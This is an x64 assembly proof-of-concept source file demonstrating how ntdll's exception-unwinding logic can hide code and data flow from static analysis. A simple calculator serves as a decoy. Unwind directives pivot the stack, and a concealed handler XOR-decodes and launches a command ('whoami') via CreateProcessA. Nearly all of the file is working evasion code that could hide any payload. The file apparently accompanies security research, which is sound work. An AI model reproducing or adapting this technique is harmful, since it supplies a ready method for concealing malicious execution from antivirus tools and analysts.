;
; Poof of concept code for abusing the exception handling logic
; inside of ntdll to hide code and data flow.
;
; This code and research was done by:              lldre
; Link to a blog post explaining this technique:   https://saza.re/exception_hijacking/
;
;
; DISCLAIMER: This proof of concept is for educational purposes only, I will
;             not be liable for any misuse or abuse resulting from it
;
;


PUBLIC first_val

EXTERN CreateProcessA :PROC


.DATA
; "cmd.exe /c echo. & whoami" (xor'd with 0x88)
cmd DB 0EBh, 0E5h, 0ECh, 0A6h, 0EDh, 0F0h, 0EDh, 0A8h, 0A7h, 0EBh, 0A8h, 0EDh, 0EBh, 0E0h, 0E7h, 0A6h, 0A8h, 0AEh, 0A8h, 0FFh, 0E0h, 0E7h, 0E9h, 0E5h, 0E1h, 088h
align(8)
usage DB "Usage: <exe> [16-bit number] [+|-|/] [16-bit number]\n", 0
align(8)
first_val  QWORD 0
second_val QWORD 0
tmp_cmd QWORD (OFFSET cmd)
tmp_ptr  QWORD (OFFSET CreateProcessA)

; After the first RtlVirtualUnwind, this will be
; the value that it thinks is the stored return pointer
; after unwinding the prolog. As such it will take this
; pointer, check if it has a valid RUNTIME_FUNCTION associated
; with it and execute its exception handler, which is `dispatcher`.
tmp_var  QWORD (OFFSET tmp)


.CODE

; The "Exception Handler" that is linked to our `tmp` function.
; This gets executed after the `handler` exception handler and 
; shouldn't be linked to anything in the binary.
align(16)
dispatcher PROC
    push rbp
    mov rbp, rsp
    push rdi

    ; Create enough stack space to store 2 structs
    ; and push the arguments to CreateProcessA
    sub rsp, (068h + 020h + 020h + (6 * 8))
    
    ; zero initialise lpStartupInfo
    lea rdi, [rbp - 068h]
    mov rcx, 0Dh
    xor rax, rax
    rep stosq

    ; initialise STARTUPINFO->cb member
    mov eax, 068h
    lea rdi, [rbp - 068h]
    mov [rdi], eax

    ; zero initialise lpProcessInformation
    lea rdi, [rbp - 088h]
    mov rcx, 4
    xor rax, rax
    rep stosq

    ; Load CONTEXT->Rdx containing ptr to our
    ; encrypted cmd. This was obtained with
    ; the `.pushreg rdx` opcode earlier
    mov rdx, [r14 + 088h]
    xor rcx, rcx

dcrypt:
    ; We stored our cmdline "encrypted" in the data
    ; segment, so we need to decrypt it
    mov al, [rdx + rcx]
    xor al, 088h
    mov [rdx + rcx], al
    inc rcx

    test al, al
    jne dcrypt

    ; More null arguments
    mov rcx, 0  
    mov r8, 0
    mov r9, 0

    ; lpStartupInfo
    lea rax, [rbp - 068h]
    mov [rbp - 0A0h], rax

    ; lpProcessInformation
    lea rax, [rbp - 088h]
    mov [rbp - 098h], rax

    ; Push null arguments to CreateProcessA
    xor rax, rax
    mov [rbp - 0C0h], rax
    mov [rbp - 0B8h], rax
    mov [rbp - 0B0h], rax
    mov [rbp - 0A8h], rax

    ; Call CreateProcessA from the r15 register that
    ; was used to obtain the pointer from the data section
    ; using the meta codes earlier
    mov rax, [r14 + 0F0h]
    call rax


    ; Epilog
    add rsp, (068h + 020h + 020h + (6 * 8))
    pop rdi

    ; Store return value of CreateProcessA
    ; for future use (not used in this example)
    mov [r14 + 078h], rax

    ; return code required to return from
    ; exception handler to normal code  
    mov rax, 00h              
    pop rbp
    ret

dispatcher ENDP


align(16)
tmp PROC FRAME:dispatcher
; We can't use a function containing just 1 ret. The code determines if its in
; an epilogue and if it is it won't execute the exception handler.
; That's why we add some fodder instructions so the unwinder will attempt
; to find and execute the exception handler
    .endprolog

    push rax
    pop rax
    mov rcx, r8
    add r8, 012h
    ret

tmp ENDP


; Our normal exception handler for handling the divide by 0
; In this case we statically edit "10 / 0" to "10 / 1", so
; it won't trigger an exception again and continue execution.
align(16)
handler PROC
    ; Fix the divide by 0 in "10 / 0"
    mov rax, [r8+0C8h]
    test rax, rax
    jne LABEL1
    mov rax, 01h
    mov [r8+0C8h], rax
LABEL1:
    ; Copy RSP from the original CONTEXT to the CONTEXT copy
    mov rax, [r8+098h]
    mov [r14+098h], rax

    ; Return 2 to force another loop of the exception
    ; handling logic
    mov rax, 2
    ret

handler ENDP


; The simple calculator code used as a front for hiding
; our exception shenanigans. 
align(16)
calc PROC FRAME:handler

    push rbp
    mov rbp, rsp

    ; Store the pointer to `first_val` on the stack, so we
    ; can retrieve it later
    mov [rbp + 10h], rcx
    mov [rbp + 18h], rdx


; ################################################################################
; ################################################################################
; This is where the magic happens. These are the "meta opcodes"
; that are invisible to the disassembler and static analysis engines.
; Keep in mind the following meta codes are executed in reverse order.
; ################################################################################

    ; load ptr to CreateProcessA
    .pushreg r15

    ; load ptr to our cmd string stored inside of 
    ; the `tmp_cmd` value
    .pushreg rdx

    ; skip `second_val`
    .pushreg rax

    ; Pivot RSP to our .DATA section using the
    ; stored pointer to `first_val`
    .pushreg rsp

    ; pop return pointer off stack
    .pushreg rax

    ; pop rbp off stack
    .pushreg rax
    .endprolog


; ################################################################################
; ################################################################################
; ################################################################################


    ; Execute the simple calculator logic
    mov rbx, [rcx]
    mov r10, [rcx + 08h]

    mov al, [rdx]

    cmp al, 02Bh
    je l_add
    cmp al, 02Dh
    je l_sub
    cmp al, 02Fh
    je l_div
    mov eax, 0
    jmp l_end

l_add:
    mov rax, rbx
    add rax, r10
    jmp l_end

l_sub:
    mov rax, rbx
    sub rax, r10
    jmp l_end

l_div:
    mov rax, rbx
    xor rdx, rdx
    idiv r10

l_end:

    pop rbp
    ret

calc ENDP

END